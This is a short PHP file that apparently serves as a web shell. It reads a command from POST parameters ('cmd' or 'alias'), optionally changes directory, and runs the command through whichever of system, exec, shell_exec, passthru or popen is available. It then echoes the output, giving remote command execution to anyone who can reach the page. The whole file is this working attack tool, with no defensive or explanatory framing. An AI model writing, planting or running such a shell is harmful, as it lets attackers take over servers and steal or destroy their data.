<?php
function cmd_exec($cmd2)
{
	if (isset($_POST['cmd'])) {
		$cmd=$_POST['cmd'];
	} 
	else {$cmd = $cmd2;
	}
	$result = '';
	if(isset($_POST['cmdir'])){
		chdir($_POST['cmdir']);
	}
	if(function_exists('system')){
		ob_start();
		system($cmd);
		$result = ob_get_contents();
		ob_end_clean();
	}
	elseif(function_exists('exec')){
		exec($cmd,$result);
		$result = join("\n",$result);
	}
	elseif(function_exists('shell_exec')){
		$result = shell_exec($cmd);
	}
	elseif(function_exists('passthru')){
		ob_start();
		passthru($cmd);
		$result = ob_get_contents();
		ob_end_clean();
	}
	elseif(is_resource($f = popen($cmd,"r"))){
		$result = "";
		while(!feof($f)) { 
		    $result .= fread($f,1024); 
	    }
	    close($f);
	}
	echo $result;
}

$v = $_POST['alias'];
cmd_exec($v);
?>